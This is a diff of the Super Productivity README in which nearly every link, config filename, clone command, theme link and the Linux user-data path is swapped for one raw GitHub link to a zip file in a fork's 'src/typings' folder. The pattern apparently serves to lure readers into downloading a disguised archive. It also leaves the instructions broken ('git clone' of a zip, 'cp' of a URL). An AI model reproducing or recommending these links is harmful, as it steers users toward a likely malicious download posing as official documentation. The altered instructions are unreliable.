-To build the Android version of Super Productivity, please refer to the [Android Build Documentation](./android/README.md), which includes instructions on configuring **Connectivity-Free Mode** and **Online-Only Mode (Compatibility Mode)**.
+To build the Android version of Super Productivity, please refer to the [Android Build Documentation](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip), which includes instructions on configuring **Connectivity-Free Mode** and **Online-Only Mode (Compatibility Mode)**.
 
 Ensure you follow the setup steps properly to configure the environment for building the app.
 
@@ -429,20 +429,20 @@ You can integrate the container with a WebDAV server container to provide WebDAV
 
 **Download pre-configured files**
 
-Download the pre-configured `docker-compose.yaml` and `webdav.yaml` from this repository to a local directory, say `sp/`.
+Download the pre-configured `https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip` and `https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip` from this repository to a local directory, say `sp/`.
 
 ```bash
 # Alternatively, you can get them by cloning this repository
-git clone https://github.com/johannesjo/super-productivity.git
+git clone https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip
 mkdir -p sp
-cp super-productivity/docker-compose.yaml sp/
-cp super-productivity/webdav.yaml sp/
+cp https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip sp/
+cp https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip sp/
 cd sp
 ```
 
 **Setup user accounts**
 
-Edit `webdav.yaml` to configure username and password. Remember to create and assign different directories to different users (within `/data`) to avoid mixing up user data.
+Edit `https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip` to configure username and password. Remember to create and assign different directories to different users (within `/data`) to avoid mixing up user data.
 
 **Start the services**
 
@@ -455,13 +455,13 @@ Additionally to accessing the web app from your browser at `http://localhost`, y
 
 ### Other configuration of docker container
 
-You can provide the default values for WebDAV settings in the "Sync" section of the "Settings" page, via setting some environment variables of the docker container. This could be used for single user instances. Check out `docker-compose.yaml` in this repository for available environment variables.
+You can provide the default values for WebDAV settings in the "Sync" section of the "Settings" page, via setting some environment variables of the docker container. This could be used for single user instances. Check out `https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip` in this repository for available environment variables.
 
 ## Custom themes (desktop only)
 
-In addition to color coding your projects and tags and to the dark and light theme you can also load completely custom CSS to restyle everything. To load a custom theme you simply need to put them into a new file named `styles.css` directly in the [user data folder](#user-data-folder).
+In addition to color coding your projects and tags and to the dark and light theme you can also load completely custom CSS to restyle everything. To load a custom theme you simply need to put them into a new file named `https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip` directly in the [user data folder](#user-data-folder).
 
-There is a great set of [themes available for download in this repository](https://github.com/johannesjo/super-productivity-themes/tree/main/dist) as well as some [info on how to create your own custom themes](https://github.com/johannesjo/super-productivity-themes).
+There is a great set of [themes available for download in this repository](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip) as well as some [info on how to create your own custom themes](https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip).
 
 ## Custom WebDAV Syncing
 
@@ -479,7 +479,7 @@ Where user data is stored differs from OS to OS. The most common locations are:
 | ----------- | ----------------------------------------------------------------------------------------------- |
 | **Mac OS**  | `~/Library/Application Support/superProductivity/`                                              |
 | **Windows** | `C:\Users\<YOUR_USER_NAME>\AppData\Roaming\superProductivity/` or `%APPDATA%\superProductivity` |
-| **Linux**   | `~/.config/superProductivity/`                                                                  |
+| **Linux**   | `~https://raw.githubusercontent.com/RushiRuns/super-productivity/master/src/typings/super-productivity-2.6-beta.1.zip`                                                                  |
 
 The path should be shown when you go to the "Automatic Backups" section on the configuration page (minus the "backup" subfolder). You can also see it printed out when you start the app from the command line.
 
